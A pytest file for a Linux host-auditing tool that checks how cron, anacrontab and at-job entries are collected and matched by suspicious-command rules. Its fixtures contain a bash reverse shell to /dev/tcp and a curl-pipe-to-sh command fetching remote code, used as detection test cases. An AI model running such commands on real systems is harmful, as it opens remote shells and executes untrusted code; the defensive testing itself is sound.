"""E8-S1/E8-S2: every cron source through the shared matcher; anacrontab and at."""
from tests import fixture_hosts as fh
from ubuntils.collectors.cron import CronCollector
from ubuntils.detectors.rules import rule_cron_suspicious_command, rule_cron_tmp_path

AT_JOB = """#!/bin/sh
# atrun uid=1000 gid=1000
# mail admin 0
umask 22
HOME=/home/admin; export HOME
cd /tmp/work || {
\t echo 'Execution directory inaccessible' >&2
\t exit 1
}
${SHELL:-/bin/sh} << 'marcinDELIMITER5d2b1c4a'
curl -s http://198.51.100.7/x | sh
marcinDELIMITER5d2b1c4a
"""


def _collect(tmp_path, files, owners=None):
    root = fh.build(tmp_path / "h", files)
    for path, (uid, gid) in (owners or {}).items():
        fh.set_owner(root, path, uid, gid)
    c = CronCollector(source=fh.fixture_source(root))
    return c.collect()["cron_entries"], c.degraded


def test_anacrontab_jobs_are_collected_and_matched(tmp_path):
    entries, degraded = _collect(tmp_path, {"/etc/anacrontab": (
        "SHELL=/bin/sh\n# comment\n"
        "1\t5\tcron.daily\trun-parts --report /etc/cron.daily\n"
        "7 10 upd bash -c 'bash -i >& /dev/tcp/192.0.2.1/4444 0>&1'\n"
        "short line\n")})
    assert degraded == []
    ana = [e for e in entries if e["kind"] == "anacron"]
    assert [e["command"] for e in ana] == ["run-parts --report /etc/cron.daily",
                                          "bash -c 'bash -i >& /dev/tcp/192.0.2.1/4444 0>&1'"]
    assert ana[1]["schedule"] == "anacron 7 (+10 min, job upd)"
    findings = rule_cron_suspicious_command({"cron_entries": entries})
    assert [f.raw_value for f in findings] == [ana[1]["command"]]


def test_at_job_takes_only_the_heredoc_commands(tmp_path):
    entries, _ = _collect(tmp_path, {"/var/spool/cron/atjobs/a0001": AT_JOB},
                          owners={"/var/spool/cron/atjobs/a0001": (1000, 1000)})
    at = [e for e in entries if e["kind"] == "at"]
    assert [e["command"] for e in at] == ["curl -s http://198.51.100.7/x | sh"]
    assert at[0]["owner"] == "uid 1000"
    found = rule_cron_suspicious_command({"cron_entries": entries})
    assert len(found) == 1 and found[0].remediation_available is False
    # The job was queued from /tmp/work; atd's `cd` preamble isn't the command.
    assert rule_cron_tmp_path({"cron_entries": entries}) == []


def test_at_job_in_an_unknown_format_keeps_non_setup_lines(tmp_path):
    entries, _ = _collect(tmp_path, {"/var/spool/cron/atjobs/b": (
        "#!/bin/sh\nexport A=1\numask 22\nB=2\n/tmp/payload --now\n")})
    at = [e for e in entries if e["kind"] == "at"]
    assert [e["command"] for e in at] == ["/tmp/payload --now"] and at[0]["owner"] == "root"
    tmp = rule_cron_tmp_path({"cron_entries": entries})
    assert len(tmp) == 1 and tmp[0].remediation_available is False  # flag-only


def test_unreadable_at_job_and_anacrontab_mark_the_collector_degraded(tmp_path):
    root = fh.build(tmp_path / "h", {"/etc/anacrontab": "x", "/var/spool/cron/atjobs/x": "y"})
    import os
    os.remove(os.path.join(root, "var/spool/cron/atjobs/x"))
    os.mkfifo(os.path.join(root, "var/spool/cron/atjobs/x"))  # a FIFO is refused, not read
    src = fh.fixture_source(root)

    class Broken(type(src)):
        def read_text(self, path):
            if path == "/etc/anacrontab":
                raise PermissionError("denied")
            return super().read_text(path)

    c = CronCollector(source=Broken(root=root, offline=True))
    c.collect()
    assert any("/etc/anacrontab" in d for d in c.degraded)
    assert any("atjobs/x" in d for d in c.degraded)


def test_root_owned_benign_entries_stay_quiet(tmp_path):
    entries, _ = _collect(tmp_path, {
        "/etc/cron.d/e2scrub": "30 3 * * 0 root test -e /run/systemd/system || "
                               "SERVICE_MODE=1 /usr/lib/x86_64-linux-gnu/e2fsprogs/e2scrub_all_cron\n",
        "/etc/cron.daily/apt-compat": "#!/bin/sh\nset -e\nexec /usr/lib/apt/apt.systemd.daily\n"})
    assert rule_cron_suspicious_command({"cron_entries": entries}) == []
